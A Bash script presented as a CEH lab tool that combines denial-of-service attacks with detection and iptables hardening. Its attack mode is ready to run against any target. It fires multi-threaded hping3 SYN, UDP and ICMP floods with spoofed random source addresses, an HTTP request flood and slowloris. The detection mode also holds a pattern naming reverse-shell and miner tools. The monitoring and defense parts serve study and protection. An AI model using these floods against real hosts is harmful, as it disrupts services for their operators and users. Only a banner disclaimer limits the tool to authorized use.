#!/usr/bin/env bash
#
# ╔══════════════════════════════════════════════════════════════╗
# ║         GoldenEye – CEH Lab DoS/DDoS Tool (Bash)            ║
# ║         Attack | Detection | Defense | Monitoring           ║
# ║         For Authorized Lab / CEH Study Use ONLY             ║
# ╚══════════════════════════════════════════════════════════════╝
#

set -euo pipefail

# ------------------------------
# Colors & Banner
# ------------------------------
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
MAGENTA='\033[95m'
CYAN='\033[96m'
WHITE='\033[97m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

banner() {
    echo -e "
${CYAN}${BOLD}
 ██████╗  ██████╗ ██╗     ██████╗ ███████╗███╗   ██╗     ███████╗██╗   ██╗███████╗
██╔════╝ ██╔═══██╗██║     ██╔══██╗██╔════╝████╗  ██║     ██╔════╝╚██╗ ██╔╝██╔════╝
██║  ███╗██║   ██║██║     ██║  ██║█████╗  ██╔██╗ ██║     █████╗   ╚████╔╝ █████╗  
██║   ██║██║   ██║██║     ██║  ██║██╔══╝  ██║╚██╗██║     ██╔══╝    ╚██╔╝  ██╔══╝  
╚██████╔╝╚██████╔╝███████╗██████╔╝███████╗██║ ╚████║     ███████╗   ██║   ███████╗
 ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝     ╚══════╝   ╚═╝   ╚══════╝
${RESET}
${YELLOW}  ┌─────────────────────────────────────────────────────────┐
${YELLOW}  │  GoldenEye – CEH Lab Tool (Bash) | Attack·Detect·Defend │
${YELLOW}  │  Use ONLY on systems you own or have permission to test │
${YELLOW}  └─────────────────────────────────────────────────────────┘${RESET}
"
}

# ------------------------------
# Configuration & Logging
# ------------------------------
LOG_DIR="./ceh_logs"
mkdir -p "$LOG_DIR"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
PLAIN_LOG="$LOG_DIR/session_${TIMESTAMP}.log"
JSON_LOG="$LOG_DIR/session_${TIMESTAMP}.json"
EVENTS_JSON="[]"

log_event() {
    local level="$1"
    local msg="$2"
    local extra="${3:-{}}"
    local ts=$(date -Iseconds)
    local color=""
    case "$level" in
        INFO)    color="$GREEN" ;;
        WARN)    color="$YELLOW" ;;
        ALERT)   color="${RED}${BOLD}" ;;
        ATTACK)  color="$MAGENTA" ;;
        DEFENSE) color="$CYAN" ;;
        *)       color="$WHITE" ;;
    esac
    echo -e "${color}[$level]${RESET} $msg" | tee -a "$PLAIN_LOG"
    # Update JSON array
    local event=$(jq -n --arg ts "$ts" --arg lvl "$level" --arg m "$msg" --argjson ex "$extra" \
        '{timestamp: $ts, level: $lvl, message: $m, extra: $ex}')
    EVENTS_JSON=$(echo "$EVENTS_JSON" | jq --argjson e "$event" '. + [$e]')
    echo "$EVENTS_JSON" > "$JSON_LOG"
}

# ------------------------------
# Helper Functions
# ------------------------------
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_event "WARN" "This tool requires root privileges. Re-run with sudo."
        exit 1
    fi
}

check_tools() {
    local missing=()
    for tool in tcpdump jq ip iptables ss ps hping3 curl; do
        if ! command -v "$tool" &>/dev/null; then
            missing+=("$tool")
        fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        log_event "WARN" "Missing tools: ${missing[*]}. Install with: apt install tcpdump jq iproute2 iptables procps hping3 curl"
        exit 1
    fi
}

resolve_target() {
    local target="$1"
    target="${target#http://}"
    target="${target#https://}"
    target="${target%%/*}"
    target="${target%:*}"
    local ip
    if ip=$(getent ahosts "$target" | head -1 | awk '{print $1}'); then
        echo "$ip"
    else
        log_event "WARN" "Cannot resolve $target"
        exit 1
    fi
}

# ------------------------------
# Attack Modes
# ------------------------------
attack_syn() {
    local target_ip="$1" port="$2" count="$3" threads="$4"
    log_event "ATTACK" "SYN Flood → $target_ip:$port ($count pkts, $threads threads)"
    for ((i=1; i<=threads; i++)); do
        hping3 -S -p "$port" --flood --rand-source -c "$count" "$target_ip" &>/dev/null &
    done
    wait
    log_event "ATTACK" "SYN Flood completed"
}

attack_udp() {
    local target_ip="$1" port="$2" count="$3" threads="$4"
    log_event "ATTACK" "UDP Flood → $target_ip:$port ($count pkts, $threads threads)"
    for ((i=1; i<=threads; i++)); do
        hping3 --udp -p "$port" --flood --rand-source -c "$count" "$target_ip" &>/dev/null &
    done
    wait
    log_event "ATTACK" "UDP Flood completed"
}

attack_icmp() {
    local target_ip="$1" count="$2" threads="$3"
    log_event "ATTACK" "ICMP Flood → $target_ip ($count pkts, $threads threads)"
    for ((i=1; i<=threads; i++)); do
        hping3 --icmp --flood --rand-source -c "$count" "$target_ip" &>/dev/null &
    done
    wait
    log_event "ATTACK" "ICMP Flood completed"
}

attack_http() {
    local target_ip="$1" port="$2" count="$3" threads="$4"
    log_event "ATTACK" "HTTP Flood → $target_ip:$port ($count reqs, $threads threads)"
    local url="http://$target_ip:$port/"
    if command -v ab &>/dev/null; then
        ab -n "$count" -c "$threads" "$url" &>/dev/null
    else
        for ((i=1; i<=threads; i++)); do
            (for ((j=1; j<=count/threads; j++)); do curl -s -o /dev/null "$url?$RANDOM" & done; wait) &
        done
        wait
    fi
    log_event "ATTACK" "HTTP Flood completed"
}

attack_slowloris() {
    local target_ip="$1" port="$2" sockets="$3"
    log_event "ATTACK" "Slowloris → $target_ip:$port ($sockets sockets)"
    if command -v slowloris &>/dev/null; then
        slowloris -dns "$target_ip" -port "$port" -num "$sockets" -timeout 1000 -tcpto 5 &
        SLOWLORIS_PID=$!
        sleep 30
        kill $SLOWLORIS_PID 2>/dev/null
    else
        log_event "WARN" "slowloris tool not installed. Install from: https://github.com/gkbrk/slowloris"
    fi
}

# ------------------------------
# Detection Mode (with monitoring)
# ------------------------------
DETECT_RUNNING=0
DETECT_INTERFACE=""
PCAP_FILE="/tmp/goldeneye_capture.pcap"
ALERT_THRESHOLD_SYN=100
ALERT_THRESHOLD_UDP=200
ALERT_THRESHOLD_ICMP=50
ALERT_THRESHOLD_HTTP=150
MONITOR_PROCESSES=0
MONITOR_CONNECTIONS=0
MONITOR_FILES=0

monitor_processes() {
    while [[ $DETECT_RUNNING -eq 1 ]]; do
        local high_cpu=$(ps -eo pid,pcpu,comm --sort=-pcpu | awk 'NR>1 && $2>80 {print $3" ("$2"%)"}')
        [[ -n "$high_cpu" ]] && log_event "ALERT" "High CPU processes: $high_cpu"
        local suspicious=$(ps -eo comm | grep -E '(nc|netcat|ncat|socat|python.*-c|bash.*-i|curl.*\|sh|wget.*\|sh|minerd|stratum|xmrig)' || true)
        [[ -n "$suspicious" ]] && log_event "ALERT" "Suspicious processes: $suspicious"
        sleep 10
    done
}

monitor_connections() {
    while [[ $DETECT_RUNNING -eq 1 ]]; do
        ss -tan state established | awk '{print $4}' | cut -d: -f1 | sort | uniq -c | sort -nr | head -10 | while read count ip; do
            if [[ $count -gt 100 ]]; then
                log_event "ALERT" "High connection count from $ip: $count connections"
            fi
        done
        sleep 15
    done
}

monitor_files() {
    if ! command -v inotifywait &>/dev/null; then
        log_event "WARN" "inotifywait not installed. Install inotify-tools for file monitoring."
        return
    fi
    inotifywait -m -r -e modify,create,delete /etc /usr/bin /tmp 2>/dev/null | while read event; do
        log_event "ALERT" "File change detected: $event"
    done
}

analyze_traffic() {
    local iface="$1"
    log_event "INFO" "Starting packet capture on $iface (analysis every 5 seconds)"
    tcpdump -i "$iface" -s 100 -G 5 -W 1 -w "$PCAP_FILE" &>/dev/null &
    local tcpdump_pid=$!
    sleep 2
    while [[ $DETECT_RUNNING -eq 1 ]]; do
        if [[ -f "$PCAP_FILE" ]]; then
            local syn=$(tcpdump -r "$PCAP_FILE" -c 1000 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0' 2>/dev/null | wc -l)
            local udp=$(tcpdump -r "$PCAP_FILE" -c 1000 'udp' 2>/dev/null | wc -l)
            local icmp=$(tcpdump -r "$PCAP_FILE" -c 1000 'icmp' 2>/dev/null | wc -l)
            local http=$(tcpdump -r "$PCAP_FILE" -c 1000 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420)' 2>/dev/null | wc -l)
            local syn_rate=$((syn / 5))
            local udp_rate=$((udp / 5))
            local icmp_rate=$((icmp / 5))
            local http_rate=$((http / 5))
            echo -ne "\r${DIM}[STATS] SYN:${syn_rate}/s UDP:${udp_rate}/s ICMP:${icmp_rate}/s HTTP:${http_rate}/s${RESET}    "
            [[ $syn_rate -gt $ALERT_THRESHOLD_SYN ]] && log_event "ALERT" "SYN flood detected: $syn_rate SYN/s"
            [[ $udp_rate -gt $ALERT_THRESHOLD_UDP ]] && log_event "ALERT" "UDP flood detected: $udp_rate UDP/s"
            [[ $icmp_rate -gt $ALERT_THRESHOLD_ICMP ]] && log_event "ALERT" "ICMP flood detected: $icmp_rate ICMP/s"
            [[ $http_rate -gt $ALERT_THRESHOLD_HTTP ]] && log_event "ALERT" "HTTP flood detected: $http_rate HTTP requests/s"
        fi
        sleep 5
    done
    kill $tcpdump_pid 2>/dev/null
}

start_detection() {
    local iface="$1"
    DETECT_RUNNING=1
    DETECT_INTERFACE="$iface"
    log_event "INFO" "Detection engine started on $iface"
    [[ $MONITOR_PROCESSES -eq 1 ]] && monitor_processes &
    local monitor_pid=$!
    [[ $MONITOR_CONNECTIONS -eq 1 ]] && monitor_connections &
    local conn_pid=$!
    [[ $MONITOR_FILES -eq 1 ]] && monitor_files &
    local file_pid=$!
    analyze_traffic "$iface"
    kill $monitor_pid $conn_pid $file_pid 2>/dev/null
    DETECT_RUNNING=0
    log_event "INFO" "Detection stopped"
}

# ------------------------------
# Defense Mode (iptables & sysctl)
# ------------------------------
defense_harden() {
    log_event "DEFENSE" "Applying full hardening profile"
    sysctl -w net.ipv4.tcp_syncookies=1 >> "$PLAIN_LOG"
    sysctl -w net.ipv4.tcp_max_syn_backlog=2048 >> "$PLAIN_LOG"
    sysctl -w net.ipv4.tcp_synack_retries=2 >> "$PLAIN_LOG"
    iptables -A INPUT -p tcp --syn -m limit --limit 100/s --limit-burst 200 -j ACCEPT
    iptables -A INPUT -p tcp --syn -j DROP
    iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 10/s --limit-burst 20 -j ACCEPT
    iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
    iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j REJECT
    iptables -A INPUT -m conntrack --ctstate NEW -m limit --limit 1000/s -j ACCEPT
    iptables -A INPUT -m conntrack --ctstate NEW -j DROP
    log_event "DEFENSE" "Full hardening applied"
}

defense_block_ip() {
    local ip="$1"
    iptables -A INPUT -s "$ip" -j DROP
    log_event "DEFENSE" "Blocked IP: $ip"
}

defense_blackhole() {
    local ip="$1"
    ip route add blackhole "$ip"/32
    log_event "DEFENSE" "Blackholed IP: $ip"
}

defense_block_port() {
    local port="$1"
    iptables -A INPUT -p tcp --dport "$port" -j DROP
    log_event "DEFENSE" "Blocked port: $port/tcp"
}

defense_flush() {
    iptables -F
    iptables -X
    log_event "DEFENSE" "Flushed all iptables rules"
}

defense_show() {
    iptables -L -n -v
}

# ------------------------------
# Report Generation
# ------------------------------
generate_report() {
    local report_file="$LOG_DIR/report_${TIMESTAMP}.txt"
    {
        echo "================================================================="
        echo "  GoldenEye Session Report (Bash)"
        echo "  Generated: $(date)"
        echo "================================================================="
        echo ""
        echo "SESSION INFO"
        echo "-----------------------------------------"
        echo "  Log file       : $PLAIN_LOG"
        echo "  JSON log       : $JSON_LOG"
        echo ""
        echo "EVENT LOG"
        echo "-----------------------------------------"
        cat "$PLAIN_LOG"
    } > "$report_file"
    log_event "INFO" "Report generated: $report_file"
}

# ------------------------------
# Help / Usage
# ------------------------------
usage() {
    banner
    echo "Usage: $0 {attack|detect|defend|report} [options]"
    echo ""
    echo "ATTACK:"
    echo "  $0 attack <target> -a {syn|udp|icmp|http|slowloris} [-p port] [-c count] [-t threads]"
    echo ""
    echo "DETECT:"
    echo "  $0 detect -i <interface> [--threshold-syn N] [--threshold-udp N] [--threshold-icmp N] [--threshold-http N]"
    echo "  Additional monitoring: --monitor-processes --monitor-connections --monitor-files"
    echo ""
    echo "DEFEND:"
    echo "  $0 defend --harden"
    echo "  $0 defend --block-ip <IP>"
    echo "  $0 defend --blackhole-ip <IP>"
    echo "  $0 defend --block-port <PORT>"
    echo "  $0 defend --flush"
    echo "  $0 defend --show-rules"
    echo ""
    echo "REPORT:"
    echo "  $0 report"
    exit 1
}

# ------------------------------
# Main
# ------------------------------
if [[ $# -lt 1 ]]; then
    usage
fi

MODE="$1"
shift

case "$MODE" in
    attack)
        TARGET=""
        ATTACK_TYPE=""
        PORT=80
        COUNT=1000
        THREADS=1
        while [[ $# -gt 0 ]]; do
            case "$1" in
                -a|--attack) ATTACK_TYPE="$2"; shift 2 ;;
                -p|--port) PORT="$2"; shift 2 ;;
                -c|--count) COUNT="$2"; shift 2 ;;
                -t|--threads) THREADS="$2"; shift 2 ;;
                *) TARGET="$1"; shift ;;
            esac
        done
        if [[ -z "$TARGET" || -z "$ATTACK_TYPE" ]]; then
            usage
        fi
        check_root
        check_tools
        TARGET_IP=$(resolve_target "$TARGET")
        log_event "INFO" "Resolved $TARGET -> $TARGET_IP"
        case "$ATTACK_TYPE" in
            syn) attack_syn "$TARGET_IP" "$PORT" "$COUNT" "$THREADS" ;;
            udp) attack_udp "$TARGET_IP" "$PORT" "$COUNT" "$THREADS" ;;
            icmp) attack_icmp "$TARGET_IP" "$COUNT" "$THREADS" ;;
            http) attack_http "$TARGET_IP" "$PORT" "$COUNT" "$THREADS" ;;
            slowloris) attack_slowloris "$TARGET_IP" "$PORT" 200 ;;
            *) usage ;;
        esac
        ;;
    detect)
        INTERFACE=""
        while [[ $# -gt 0 ]]; do
            case "$1" in
                -i|--interface) INTERFACE="$2"; shift 2 ;;
                --threshold-syn) ALERT_THRESHOLD_SYN="$2"; shift 2 ;;
                --threshold-udp) ALERT_THRESHOLD_UDP="$2"; shift 2 ;;
                --threshold-icmp) ALERT_THRESHOLD_ICMP="$2"; shift 2 ;;
                --threshold-http) ALERT_THRESHOLD_HTTP="$2"; shift 2 ;;
                --monitor-processes) MONITOR_PROCESSES=1; shift ;;
                --monitor-connections) MONITOR_CONNECTIONS=1; shift ;;
                --monitor-files) MONITOR_FILES=1; shift ;;
                *) usage ;;
            esac
        done
        if [[ -z "$INTERFACE" ]]; then
            usage
        fi
        check_root
        check_tools
        start_detection "$INTERFACE"
        ;;
    defend)
        check_root
        check_tools
        if [[ $# -eq 0 ]]; then
            usage
        fi
        while [[ $# -gt 0 ]]; do
            case "$1" in
                --harden) defense_harden; shift ;;
                --block-ip) defense_block_ip "$2"; shift 2 ;;
                --blackhole-ip) defense_blackhole "$2"; shift 2 ;;
                --block-port) defense_block_port "$2"; shift 2 ;;
                --flush) defense_flush; shift ;;
                --show-rules) defense_show; exit 0 ;;
                *) usage ;;
            esac
        done
        ;;
    report)
        generate_report
        ;;
    *)
        usage
        ;;
esac

# Final summary
if [[ -f "$JSON_LOG" ]]; then
    attack_count=$(jq '[.[] | select(.level=="ATTACK")] | length' "$JSON_LOG")
    alert_count=$(jq '[.[] | select(.level=="ALERT")] | length' "$JSON_LOG")
    defense_count=$(jq '[.[] | select(.level=="DEFENSE")] | length' "$JSON_LOG")
    echo -e "\n${BOLD}${CYAN}━━━━━━━━━━━━━━━  SESSION SUMMARY  ━━━━━━━━━━━━━━━${RESET}"
    echo "  Total Events : $(jq length "$JSON_LOG")"
    echo -e "  Attacks      : ${MAGENTA}$attack_count${RESET}"
    echo -e "  Alerts       : ${RED}$alert_count${RESET}"
    echo -e "  Defenses     : ${CYAN}$defense_count${RESET}"
    echo -e "  Plain Log    : $PLAIN_LOG"
    echo -e "  JSON Log     : $JSON_LOG"
    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
fi
